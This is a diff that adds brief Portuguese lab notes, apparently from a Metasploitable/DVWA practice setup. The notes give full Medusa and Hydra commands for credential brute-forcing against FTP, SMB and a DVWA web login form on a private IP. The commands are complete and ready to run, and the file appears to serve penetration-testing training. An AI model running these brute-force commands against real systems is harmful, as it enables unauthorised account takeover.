@@ -1,0 +1,9 @@
+1. Ataque de Força Bruta em FTP (Porta 21)
+
+Comando : medusa -h 192.168.10.10 -u msfadmin -P senhas.txt -M ftp
+
+2. Password Spraying em SMB (Porta 139/445)
+Comando : medusa -h 192.168.10.10 -u msfadmin -P senhas.txt -M smbnt
+
+3. Ataque Web em Formulário de Login (DVWA - Porta 80)
+Comando : hydra -l admin -P senhas.txt 192.168.10.10 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
